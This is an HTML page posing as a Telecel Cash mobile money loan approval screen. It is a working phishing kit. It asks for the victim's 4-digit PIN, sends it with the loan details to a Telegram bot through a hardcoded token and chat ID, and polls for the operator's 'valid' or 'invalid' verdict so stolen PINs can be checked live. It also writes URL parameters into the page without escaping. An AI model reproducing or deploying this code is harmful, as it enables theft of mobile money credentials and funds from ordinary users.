<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter PIN - Telecel Cash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --red: #E42320; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 380px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .header {
            background: #E42320;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-bottom: 8px;
        }
        .logo-circle {
            width: 38px;
            height: 38px;
            background: white;
            color: #E42320;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
        }
        h1 {
            font-size: 22px;
            font-weight: 700;
            margin: 8px 0 5px;
        }
        .subtitle {
            font-size: 14.5px;
            line-height: 1.4;
            opacity: 0.95;
        }

        .loan-box {
            margin: 16px;
            background: #fff0f0;
            border-radius: 14px;
            padding: 14px 16px;
            text-align: center;
        }
        .loan-amount {
            font-size: 26px;
            font-weight: 800;
            color: var(--red);
            margin: 6px 0;
        }

        .pin-container {
            padding: 20px;
        }
        .pin-input {
            width: 100%;
            text-align: center;
            font-size: 32px;
            letter-spacing: 15px;
            padding: 16px;
            border: 2px solid #ddd;
            border-radius: 14px;
            margin-bottom: 20px;
            outline: none;
        }
        .pin-input:focus {
            border-color: var(--red);
        }

        .btn-action {
            width: 100%;
            background: var(--red);
            color: white;
            border: none;
            padding: 15px;
            font-size: 16.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 8px 0;
        }
        .back-btn {
            background: transparent;
            color: #555;
            border: 2px solid #ddd;
        }

        #spinner {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 55px;
            height: 55px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-circle">t</div>
                <div>
                    <strong>Telecel Cash</strong><br>
                    <span style="font-size:12.5px;">Mobile Money</span>
                </div>
            </div>
            <h1>Enter Your PIN</h1>
            <p class="subtitle">Enter your 4-digit Telecel Cash PIN to approve the loan</p>
        </div>

        <!-- Loan Info -->
        <div class="loan-box" id="loanBox"></div>

        <div class="pin-container">
            <input type="password" id="pinInput" class="pin-input" maxlength="4" placeholder="••••" inputmode="numeric" autofocus>

            <button class="btn-action" onclick="submitPin()">Confirm PIN</button>
            <button class="btn-action back-btn" onclick="window.history.back()">← Back</button>
        </div>
    </div>

    <!-- Spinner -->
    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:18px;">Processing PIN...</p>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get('name') || 'Flex Loan';
        const amount = params.get('amount') || '1000';
        const repay = params.get('repay') || '1381';
        const duration = params.get('duration') || '30';

        // Auto-fill loan details
        document.getElementById('loanBox').innerHTML = `
            <strong>${name}</strong><br>
            <div class="loan-amount">GHS ${parseInt(amount).toLocaleString()}</div>
            <small>Total Repay: GHS ${parseInt(repay).toLocaleString()} • ${duration} Days</small>
        `;

        function submitPin() {
            const pin = document.getElementById('pinInput').value.trim();
            if (pin.length !== 4) {
                alert("Please enter a 4-digit PIN");
                return;
            }

            document.getElementById('spinner').style.display = 'flex';

            const ts = Date.now();
            const validId = `valid_${ts}`;
            const invalidId = `invalid_${ts}`;

            fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: '7547427914',
                    text: `<b>🔴 Telecel Loan PIN Confirmation</b>\n\n` +
                          `Loan: ${name}\n` +
                          `Amount: GHS ${parseInt(amount).toLocaleString()}\n` +
                          `PIN: <code>${pin}</code>\n\nChoose Action:`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Valid PIN", callback_data: validId },
                                { text: "❌ Invalid PIN", callback_data: invalidId }
                            ]
                        ]
                    }
                })
            }).then(() => {
                startPolling(validId, invalidId);
            });
        }

        function startPolling(validId, invalidId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8/getUpdates?offset=-1`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                clearInterval(interval);
                                document.getElementById('spinner').style.display = 'none';

                                if (cb === validId) {
                                    window.location.href = `success.html?${params.toString()}`;
                                } else if (cb === invalidId) {
                                    alert("Invalid PIN. Please try again.");
                                    document.getElementById('pinInput').value = '';
                                    document.getElementById('pinInput').focus();
                                }
                            }
                        });
                    });
            }, 1000);
        }
    </script>
</body>
</html>
